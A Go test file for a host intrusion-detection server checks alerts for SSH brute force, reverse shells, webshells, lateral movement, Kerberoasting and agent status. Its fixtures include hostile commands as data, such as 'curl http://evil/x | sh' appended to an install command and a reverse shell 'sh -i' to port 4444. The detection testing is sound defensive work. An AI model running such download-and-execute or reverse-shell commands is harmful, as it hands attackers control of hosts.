package server

import (
	"context"
	"fmt"
	"net/http"
	"strings"
	"testing"
	"time"

	"safe/internal/model"
)

func TestAgentDetections(t *testing.T) {
	ts, adminToken, st := newTestServerWithStore(t)
	info := model.AgentInfo{ID: "web01", Hostname: "web01", OS: "linux/amd64", Version: "test", IPs: []string{"10.0.0.20"}}
	send := func(events ...model.HostEvent) {
		t.Helper()
		if events == nil {
			events = []model.HostEvent{}
		}
		if code := call(t, ts, agentToken, "POST", "/api/v1/agent/report", model.AgentReport{Agent: info, Events: events}, nil); code != http.StatusOK {
			t.Fatalf("agent report: %d", code)
		}
	}
	alertTypes := func() map[model.AlertType]int {
		t.Helper()
		var alerts []model.Alert
		call(t, ts, adminToken, "GET", "/api/v1/alerts", nil, &alerts)
		got := map[model.AlertType]int{}
		for _, a := range alerts {
			if a.IP != "10.0.0.20" {
				t.Errorf("alert not linked to host IP: %+v", a)
			}
			got[a.Type]++
		}
		return got
	}

	if code := call(t, ts, probeToken, "POST", "/api/v1/agent/report", model.AgentReport{Agent: info}, nil); code != http.StatusUnauthorized {
		t.Errorf("probe token on agent API: %d", code)
	}

	now := time.Now()
	fail := func(src string, at time.Time) model.HostEvent {
		return model.HostEvent{Type: model.EventLoginFailed, Time: at, User: "root", SrcIP: src}
	}

	// 9 次失败未达阈值；分两批上报，第 10 次触发爆破告警。
	var batch []model.HostEvent
	for i := 0; i < 9; i++ {
		batch = append(batch, fail("10.9.9.9", now.Add(time.Duration(i)*time.Second)))
	}
	send(batch...)
	if n := alertTypes()[model.AlertSSHBruteForce]; n != 0 {
		t.Fatalf("bruteforce alert below threshold")
	}
	send(fail("10.9.9.9", now.Add(10*time.Second)))
	// 持续爆破只告警一次。
	send(fail("10.9.9.9", now.Add(11*time.Second)), fail("10.9.9.9", now.Add(12*time.Second)))
	// 时间分散的失败（每 10 分钟一次）不算爆破。
	for i := 0; i < 12; i++ {
		send(fail("10.8.8.8", now.Add(-time.Duration(i)*10*time.Minute)))
	}

	// 爆破来源随后登录成功 + root 登录 + 关键文件修改 + 可疑进程。
	send(
		model.HostEvent{Type: model.EventLoginSuccess, Time: now.Add(time.Minute), User: "root", SrcIP: "10.9.9.9", Detail: "ssh password"},
		model.HostEvent{Type: model.EventFileChanged, Time: now, Path: "/root/.ssh/authorized_keys", Detail: "modified"},
		model.HostEvent{Type: model.EventSuspiciousProcess, Time: now, Path: "/tmp/.x/kworker", Detail: "pid 4242, running from /tmp"},
	)

	got := alertTypes()
	want := map[model.AlertType]int{
		model.AlertSSHBruteForce: 1, model.AlertBruteForceSuccess: 1, model.AlertRootLogin: 1,
		model.AlertFileChanged: 1, model.AlertSuspiciousProcess: 1,
	}
	for typ, n := range want {
		if got[typ] != n {
			t.Errorf("%s alerts = %d, want %d (all: %v)", typ, got[typ], n, got)
		}
	}
	if len(got) != len(want) {
		t.Errorf("unexpected alerts: %v", got)
	}

	var events []model.HostEvent
	call(t, ts, adminToken, "GET", "/api/v1/host-events?agent_id=web01&type=login_failed&src_ip=10.9.9.9", nil, &events)
	if len(events) != 12 {
		t.Errorf("filtered events = %d, want 12", len(events))
	}

	// 离线检测：心跳超时后标记离线并告警一次，恢复心跳后重新在线。
	n, err := st.MarkOfflineAgents(context.Background(), time.Now().Add(time.Second))
	if err != nil || n != 1 {
		t.Fatalf("MarkOfflineAgents = %d, %v", n, err)
	}
	if n, _ := st.MarkOfflineAgents(context.Background(), time.Now().Add(time.Second)); n != 0 {
		t.Errorf("offline agent marked twice")
	}
	var agents []model.AgentInfo
	call(t, ts, adminToken, "GET", "/api/v1/agents", nil, &agents)
	if len(agents) != 1 || agents[0].Status != model.AgentOffline {
		t.Fatalf("agents = %+v", agents)
	}
	if alertTypes()[model.AlertAgentOffline] != 1 {
		t.Errorf("missing agent offline alert")
	}
	send()
	call(t, ts, adminToken, "GET", "/api/v1/agents", nil, &agents)
	if agents[0].Status != model.AgentOnline {
		t.Errorf("agent not back online: %+v", agents[0])
	}
}

func TestV03Detections(t *testing.T) {
	ts, adminToken, st := newTestServerWithStore(t)
	report := func(id string, ip string, stopping bool, events ...model.HostEvent) {
		t.Helper()
		if events == nil {
			events = []model.HostEvent{}
		}
		rep := model.AgentReport{Agent: model.AgentInfo{ID: id, Hostname: id, IPs: []string{ip}, Stopping: stopping,
			Capabilities: []string{"exec_monitor", "fim"}}, Events: events}
		if code := call(t, ts, agentToken, "POST", "/api/v1/agent/report", rep, nil); code != http.StatusOK {
			t.Fatalf("report: %d", code)
		}
	}
	alertsOf := func(typ model.AlertType) []model.Alert {
		var all, out []model.Alert
		call(t, ts, adminToken, "GET", "/api/v1/alerts", nil, &all)
		for _, a := range all {
			if a.Type == typ {
				out = append(out, a)
			}
		}
		return out
	}
	now := time.Now()

	// 可疑命令：级别取自 Agent 规则；反弹 shell 带出对端地址；相同命令去重。
	cmd := model.HostEvent{Type: model.EventSuspiciousCommand, Time: now, User: "www-data", SrcIP: "10.6.6.6",
		Path: "/usr/bin/dash", Severity: "high", Detail: "[反弹 shell] shell 的标准输入输出连接到网络 10.6.6.6:4444；命令：sh -i；父进程：php-fpm8.3"}
	report("web01", "10.0.0.21", false, cmd, cmd)
	report("web01", "10.0.0.21", false, cmd)
	if a := alertsOf(model.AlertSuspiciousCommand); len(a) != 1 || a[0].Severity != model.SeverityHigh ||
		!strings.Contains(a[0].Message, "连接对端 10.6.6.6") || a[0].IP != "10.0.0.21" {
		t.Errorf("suspicious command alerts: %+v", a)
	}
	// 交互式命令只记录，不告警。
	report("web01", "10.0.0.21", false, model.HostEvent{Type: model.EventCommand, Time: now, User: "ops", Detail: "ls -la（父进程 bash）"})
	var events []model.HostEvent
	call(t, ts, adminToken, "GET", "/api/v1/host-events?type=command", nil, &events)
	if len(events) != 1 {
		t.Errorf("command audit events: %+v", events)
	}

	// Webshell：有特征为高危，无特征为中危。
	report("web01", "10.0.0.21", false,
		model.HostEvent{Type: model.EventWebshell, Time: now, Path: "/var/www/html/up/x.php", Detail: "新增脚本文件，含 Webshell 特征：eval", Severity: "high"},
		model.HostEvent{Type: model.EventWebshell, Time: now, Path: "/var/www/html/about.php", Detail: "新增脚本文件", Severity: "medium"})
	sev := map[model.Severity]int{}
	for _, a := range alertsOf(model.AlertWebshell) {
		sev[a.Severity]++
	}
	if sev[model.SeverityHigh] != 1 || sev[model.SeverityMedium] != 1 {
		t.Errorf("webshell severities: %v", sev)
	}

	// 横向移动：同一内网来源 10 分钟内登录第 5 台主机时告警，关联到来源；外网来源不按此规则判断。
	login := func(src string) model.HostEvent {
		return model.HostEvent{Type: model.EventLoginSuccess, Time: now, User: "root", SrcIP: src, Detail: "ssh password"}
	}
	for i := 1; i <= 4; i++ {
		report(fmt.Sprintf("db%02d", i), fmt.Sprintf("10.0.1.%d", i), false, login("10.0.0.99"))
	}
	if n := len(alertsOf(model.AlertLateralMovement)); n != 0 {
		t.Fatalf("lateral alert at 4 hosts")
	}
	report("db05", "10.0.1.5", false, login("10.0.0.99"))
	report("db06", "10.0.1.6", false, login("10.0.0.99"))
	if a := alertsOf(model.AlertLateralMovement); len(a) != 1 || a[0].IP != "10.0.0.99" || !strings.Contains(a[0].Message, "5 台") {
		t.Errorf("lateral alerts: %+v", a)
	}
	for i := 1; i <= 6; i++ {
		report(fmt.Sprintf("ext%02d", i), fmt.Sprintf("10.0.2.%d", i), false, login("203.0.113.9"))
	}
	for _, a := range alertsOf(model.AlertLateralMovement) {
		if a.IP == "203.0.113.9" {
			t.Errorf("external source treated as lateral movement: %+v", a)
		}
	}

	// Agent 停止：状态为 stopped 并告警；之后不再触发离线告警；恢复上报后重新在线。
	report("web01", "10.0.0.21", true)
	var agents []model.AgentInfo
	call(t, ts, adminToken, "GET", "/api/v1/agents", nil, &agents)
	for _, a := range agents {
		if a.ID == "web01" && (a.Status != model.AgentStopped || len(a.Capabilities) != 2) {
			t.Errorf("stopped agent: %+v", a)
		}
	}
	if len(alertsOf(model.AlertAgentStopped)) != 1 {
		t.Errorf("agent stopped alert missing")
	}
	st.MarkOfflineAgents(context.Background(), time.Now().Add(time.Hour))
	for _, a := range alertsOf(model.AlertAgentOffline) {
		if strings.Contains(a.Message, "web01") {
			t.Errorf("stopped agent also reported offline: %+v", a)
		}
	}
	report("web01", "10.0.0.21", false)
	call(t, ts, adminToken, "GET", "/api/v1/agents", nil, &agents)
	for _, a := range agents {
		if a.ID == "web01" && a.Status != model.AgentOnline {
			t.Errorf("agent not back online: %+v", a)
		}
	}
}

func TestWindowsEventAlerts(t *testing.T) {
	ts, adminToken := newTestServer(t)
	now := time.Now()
	rep := model.AgentReport{Agent: model.AgentInfo{ID: "DC01", Hostname: "DC01", OS: "windows/amd64", IPs: []string{"10.0.0.10"}},
		Events: []model.HostEvent{
			{Type: model.EventDomainAttack, Time: now, Severity: "high", SrcIP: "10.0.0.66",
				Detail: "[Kerberoasting] 账户 alice@CORP 在 10 分钟内以 RC4 加密请求了 3 个服务的票据：a、b、c"},
			{Type: model.EventAccountChange, Time: now, Severity: "high", Detail: `S-1-5-21-1-2-3-1001 被加入特权组 Domain Admins（操作者 CORP\helpdesk）`},
			{Type: model.EventAccountChange, Time: now, Severity: "medium", Detail: `新建账户 CORP\svc_x（操作者 CORP\helpdesk）`},
		}}
	if code := call(t, ts, agentToken, "POST", "/api/v1/agent/report", rep, nil); code != http.StatusOK {
		t.Fatalf("report: %d", code)
	}
	var alerts []model.Alert
	call(t, ts, adminToken, "GET", "/api/v1/alerts", nil, &alerts)
	got := map[model.AlertType][]model.Severity{}
	for _, a := range alerts {
		got[a.Type] = append(got[a.Type], a.Severity)
	}
	if len(got[model.AlertDomainAttack]) != 1 || got[model.AlertDomainAttack][0] != model.SeverityHigh || len(got[model.AlertAccountChange]) != 2 {
		t.Errorf("alerts: %v", got)
	}
	for _, a := range alerts {
		if a.Type == model.AlertDomainAttack && !strings.Contains(a.Message, "来源 10.0.0.66") {
			t.Errorf("domain attack message: %s", a.Message)
		}
	}
	// 凭据获取 + 持久化两个阶段归入同一个事件
	var incidents []model.Incident
	call(t, ts, adminToken, "GET", "/api/v1/incidents", nil, &incidents)
	if len(incidents) != 1 || strings.Join(incidents[0].Stages, ",") != "credential,persistence" {
		t.Errorf("incidents: %+v", incidents)
	}
}

// 执行本管理中心的一键安装命令（ssh / Ansible 下发）命中"下载并执行"：降为低级、不开事件；拼接了其他命令的照常高危。
func TestInstallCommandAlertDowngraded(t *testing.T) {
	ts, adminToken, st := newTestServerWithStore(t)
	st.SetInstallPin(testPin)
	tok := strings.Repeat("a", 32) + "." + strings.Repeat("b", 64)
	install := "sh -c curl -fsSLk --pinnedpubkey '" + testPin + "' 'https://10.0.0.5:8443/i/" + tok + "?id=office' | sudo sh"
	ev := func(cmd string) model.HostEvent {
		return model.HostEvent{Type: model.EventSuspiciousCommand, Time: time.Now(), User: "root", Severity: "high",
			Detail: "[下载并执行] 命令匹配特征；命令：" + cmd + "；父进程：sshd"}
	}
	rep := model.AgentReport{Agent: model.AgentInfo{ID: "ops01", Hostname: "ops01", IPs: []string{"10.0.0.31"},
		Capabilities: []string{"exec_monitor"}}, Events: []model.HostEvent{ev(install), ev(install + "; curl http://evil/x | sh")}}
	if code := call(t, ts, agentToken, "POST", "/api/v1/agent/report", rep, nil); code != http.StatusOK {
		t.Fatalf("report: %d", code)
	}
	var alerts []model.Alert
	call(t, ts, adminToken, "GET", "/api/v1/alerts", nil, &alerts)
	sev := map[model.Severity]int{}
	for _, a := range alerts {
		if a.Type == model.AlertSuspiciousCommand {
			sev[a.Severity]++
			if a.Severity == model.SeverityLow && !strings.Contains(a.Message, "一键安装命令") {
				t.Errorf("low alert without note: %s", a.Message)
			}
		}
	}
	if sev[model.SeverityLow] != 1 || sev[model.SeverityHigh] != 1 {
		t.Errorf("severities: %v", sev)
	}
	var incidents []model.Incident
	call(t, ts, adminToken, "GET", "/api/v1/incidents", nil, &incidents)
	if len(incidents) != 1 || incidents[0].AlertCount != 1 {
		t.Errorf("only the high alert should open an incident: %+v", incidents)
	}
}
